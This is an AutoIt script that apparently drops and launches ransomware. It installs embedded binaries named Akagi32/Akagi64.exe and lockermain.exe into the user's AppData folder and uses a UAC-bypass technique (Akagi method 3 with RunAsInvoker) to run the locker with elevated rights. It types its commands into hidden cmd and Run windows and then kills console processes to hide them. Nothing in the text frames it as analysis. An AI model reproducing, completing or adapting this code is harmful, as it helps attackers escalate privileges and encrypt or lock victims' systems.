Opt("TrayIconHide", 1)
Opt("TrayAutoPause", 0)

;#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
;#AutoIt3Wrapper_Icon=cmd.ico
;#AutoIt3Wrapper_Compression=4
;#AutoIt3Wrapper_UseUpx=y
;#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
$computerbyte = @OSArch
FileDelete(@AppDataDir&"\Akagi64.exe")
FileDelete(@AppDataDir&"\Akagi32.exe")
FileDelete(@AppDataDir&"\lockermain.exe")

if $computerbyte=="X86" Then
FileInstall("Akagi32.exe",@AppDataDir&"\Akagi32.exe")
EndIf

if $computerbyte=="X64" Then
FileInstall("Akagi64.exe",@AppDataDir&"\Akagi64.exe")
EndIf

FileInstall("lockermain.exe",@AppDataDir&"\lockermain.exe")

Sleep(2000)

EnvSet("__COMPAT_LAYER", "RunAsInvoker")

if $computerbyte=="X87" then
Run("rundll32.exe shell32.dll #61", "", @SW_HIDE)
Local $hWnd = WinWait("Çalýþtýr", "", 2)
WinSetState($hWnd,"",@SW_HIDE)
if $hWnd = 0 Then
Local $hWnd = WinWait("Run", "", 2)
WinSetState($hWnd,"",@SW_HIDE)
ControlSend("Run","","[CLASS:Edit; INSTANCE:1]","cmd.exe /c SET __COMPAT_LAYER=RunAsInvoker & START %appdata%\Akagi32.exe 3 %appdata%\lockermain.exe"&"{ENTER}")
Else
ControlSend("Çalýþtýr","","[CLASS:Edit; INSTANCE:1]","cmd.exe /c SET __COMPAT_LAYER=RunAsInvoker & START %appdata%\Akagi32.exe 3 %appdata%\lockermain.exe"&"{ENTER}")
EndIf
EndIf

if $computerbyte=="X86" then
Run("cmd", "", @SW_HIDE)
Sleep(1000)
ControlSend("[CLASS:ConsoleWindowClass]","","","SET __COMPAT_LAYER=RunAsInvoker & START %appdata%\Akagi32.exe 3 %appdata%\lockermain.exe"&"{ENTER}")
Sleep(1000)
While ProcessExists("cmd.exe")
   ProcessClose("cmd.exe")
WEnd
While ProcessExists("conhost.exe")
   ProcessClose("conhost.exe")
   WEnd
EndIf

if $computerbyte=="X64" then
Run("cmd", "", @SW_HIDE)
Sleep(1000)
ControlSend("[CLASS:ConsoleWindowClass]","","","SET __COMPAT_LAYER=RunAsInvoker & START %appdata%\Akagi64.exe 3 %appdata%\lockermain.exe"&"{ENTER}")
Sleep(1000)
While ProcessExists("cmd.exe")
   ProcessClose("cmd.exe")
WEnd
While ProcessExists("conhost.exe")
   ProcessClose("conhost.exe")
   WEnd
EndIf

if $computerbyte=="X63" then
Run("rundll32.exe shell32.dll #61", "", @SW_HIDE)
Local $hWnd = WinWait("Çalýþtýr", "", 2)
WinSetState("Çalýþtýr", "", @SW_HIDE)
if $hWnd = 0 Then
Local $hWnd = WinWait("Run", "", 2)
WinSetState("Run", "", @SW_HIDE)
ControlSend("Run","","[CLASS:Edit; INSTANCE:1]","cmd.exe /c SET __COMPAT_LAYER=RunAsInvoker & START %appdata%\Akagi64.exe 3 %appdata%\lockermain.exe"&"{ENTER}")
ElseIf $hWnd <> 0 Then
ControlSend("Çalýþtýr","","[CLASS:Edit; INSTANCE:1]","cmd.exe /c SET __COMPAT_LAYER=RunAsInvoker & START %appdata%\Akagi64.exe 3 %appdata%\lockermain.exe"&"{ENTER}")
EndIf
EndIf
